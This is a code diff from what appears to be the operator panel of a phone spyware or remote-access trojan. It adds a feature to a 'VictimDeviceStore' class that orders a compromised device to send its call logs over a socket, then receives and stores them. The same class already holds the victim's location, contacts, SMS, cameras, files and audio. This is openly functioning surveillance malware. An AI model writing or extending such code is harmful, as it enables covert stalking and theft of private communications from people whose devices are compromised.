@@ -10,6 +10,7 @@ import {
     type VictimStatus,
 } from '../../common/enums';
 import {
+    type CallLogItem,
     type CameraItem,
     type CameraOrderPayload,
     type ContactItem,
@@ -49,6 +50,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public location: [number, number] | null = null;
     public contacts: ContactItem[] = [];
     public smsMessages: SMSItem[] = [];
+    public callLogs: CallLogItem[] = [];
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -75,6 +77,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
         makeObservable(this, {
             audioDataUrl: observable,
+            callLogs: observable,
             cameras: observable,
             connectionStatus: observable,
             contacts: observable,
@@ -84,6 +87,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             smsMessages: observable,
             open: observable,
             setAudio: action,
+            setCallLogs: action,
             setCameras: action,
             setContacts: action,
             setFiles: action,
@@ -199,6 +203,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
                 this.setSMSMessages(data.smsList);
             }
         });
+
+        this.socket.on(VictimOrder.CALLS, (data) => {
+            console.log(`[VICTIM] Call logs from ${this.deviceId}`, data);
+
+            this.setCallLogs(data.callsList);
+        });
     }
 
     public listCameras(): void {
@@ -266,9 +276,19 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         });
     }
 
+    public fetchCallLogs(): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.CALLS,
+        });
+    }
+
     public setAudio(audio: Buffer | null): void {
         this.audioDataUrl =
             audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
+    }
+
+    public setCallLogs(callLogs: CallLogItem[]): void {
+        this.callLogs = callLogs;
     }
 
     public setCameras(cameras: CameraItem[]): void {
